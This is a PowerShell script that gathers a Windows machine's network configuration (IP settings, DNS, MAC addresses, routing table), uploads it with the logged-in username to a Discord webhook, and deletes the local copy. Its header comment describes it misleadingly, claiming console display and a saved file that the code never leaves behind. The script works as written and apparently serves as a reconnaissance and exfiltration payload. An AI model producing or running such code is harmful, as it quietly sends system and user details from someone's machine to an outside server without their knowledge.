# n.ps1
# This script will display the network configuration details on the console and also save them to a file in the same directory, then send to a discord webhook.

function Send-ToDiscord {
    param (
        [Parameter(Mandatory=$true)]
        [string]$filePath,
        [Parameter(Mandatory=$true)]
        [string]$hookUrl
    )


    $message = @{
        username = $env:USERNAME
        content = "Uploading network configuration details"
    }

    # Send message
    Invoke-RestMethod -Uri $hookUrl -Method Post -ContentType 'Application/Json' -Body ($message | ConvertTo-Json)

    # Upload the file
    curl.exe -F "file1=@$filePath" $hookUrl
}

# Specify the Discord webhook URL here
$discordWebhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'


function Get-NetworkDetails {
    $output = @()


    $output += "IP Configuration:`n"
    $output += Get-NetIPConfiguration | Out-String -Width 4096

    $output += "`nDNS Client Settings:`n"
    $output += Get-DnsClient | Out-String -Width 4096

    $output += "`nDNS Server Addresses:`n"
    $output += Get-DnsClientServerAddress | Out-String -Width 4096

    $output += "`nNetwork Interface Details:`n"
    $output += Get-NetAdapter | Format-Table Name, Status, MacAddress, LinkSpeed -AutoSize | Out-String -Width 4096

    $output += "`nRouting Table:`n"
    $output += Get-NetRoute | Format-Table DestinationPrefix, NextHop, RouteMetric, ifIndex -AutoSize | Out-String -Width 4096

    return $output
}

# Get the network details
$networkDetails = Get-NetworkDetails

# Save to temp file
$tempFile = [IO.Path]::GetTempFileName() + ".txt"
$networkDetails | Out-File $tempFile

# Send to Discord
Send-ToDiscord -filePath $tempFile -hookUrl $discordWebhookUrl

Remove-Item $tempFile


